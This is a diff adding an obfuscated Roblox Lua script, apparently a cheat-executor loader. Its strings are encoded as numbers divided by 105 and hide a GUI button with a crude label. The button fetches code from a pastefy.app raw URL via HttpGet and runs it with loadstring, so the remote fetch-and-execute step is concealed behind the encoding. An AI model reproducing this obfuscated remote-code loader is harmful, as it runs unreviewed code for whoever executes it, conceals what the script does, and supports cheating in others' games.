@@ -1,0 +1,82 @@
+function zOfZzTQYkjhbBjaAriQAAxNDqZrDoQEIDvXKUbejowGvJs(code)res=''for i in ipairs(code)do res=res..string.char(code[i]/1000)end return res end 
+
+
+function ZfCVuezZpOzdcyjTXceKVA(c)
+tab={}
+for i = 1,#c do
+x=string.len(c[i]) 
+y=string.char(x)
+table.insert(tab,y)
+end
+x=table.concat(tab)
+return x
+end 
+
+
+function GJqIcSqnMDJpLV(code)res=ZfCVuezZpOzdcyjTXceKVA({})for i in ipairs(code)do res=res..string.char(code[i]/105)end return res end 
+
+
+local Players = game:GetService(GJqIcSqnMDJpLV({8400,11340,10185,12705,10605,11970,12075}))
+local UserInputService = game:GetService(GJqIcSqnMDJpLV({8925,12075,10605,11970,7665,11550,11760,12285,12180,8715,10605,11970,12390,11025,10395,10605}))
+local CoreGui = game:GetService(GJqIcSqnMDJpLV({7035,11655,11970,10605,7455,12285,11025}))
+
+-- Create ScreenGui
+local gui = Instance.new(GJqIcSqnMDJpLV({8715,10395,11970,10605,10605,11550,7455,12285,11025}))
+gui.Parent = CoreGui
+
+gui.ResetOnSpawn = false
+
+-- Create Frame
+local frame = Instance.new(GJqIcSqnMDJpLV({7350,11970,10185,11445,10605}))
+frame.Size = UDim2.new(0, 200, 0, 100)
+frame.Position = UDim2.new(0.5, -100, 0.5, -50)
+frame.BackgroundColor3 = Color3.fromRGB(75, 0, 130)
+frame.BorderSizePixel = 2
+frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
+frame.Parent = gui
+
+-- Make Frame Draggable
+local dragging, dragInput, dragStart, startPos
+
+local function update(input)
+    local delta = input.Position - dragStart
+    frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+end
+
+frame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = frame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+frame.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if input == dragInput and dragging then
+        update(input)
+    end
+end)
+
+-- Create Button
+local button = Instance.new(GJqIcSqnMDJpLV({8820,10605,12600,12180,6930,12285,12180,12180,11655,11550}))
+button.Size = UDim2.new(1, 0, 0.5, 0)
+button.Position = UDim2.new(0, 0, 0.25, 0)
+button.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+button.TextColor3 = Color3.fromRGB(255, 255, 255)
+button.Text = GJqIcSqnMDJpLV({11130,10605,11970,11235,3360,11655,10710,10710,3360,11340,11655,11340})
+button.Parent = frame
+
+button.MouseButton1Click:Connect(function()
+    loadstring(game:HttpGet(GJqIcSqnMDJpLV({10920,12180,12180,11760,12075,6090,4935,4935,11760,10185,12075,12180,10605,10710,12705,4830,10185,11760,11760,4935,12495,10185,5355,12390,5250,9030,10815,11445,4935,11970,10185,12495})))(GJqIcSqnMDJpLV({8715,11760,11025,10500,10605,11970,3360,8715,10395,11970,11025,11760,12180}))
+end)            
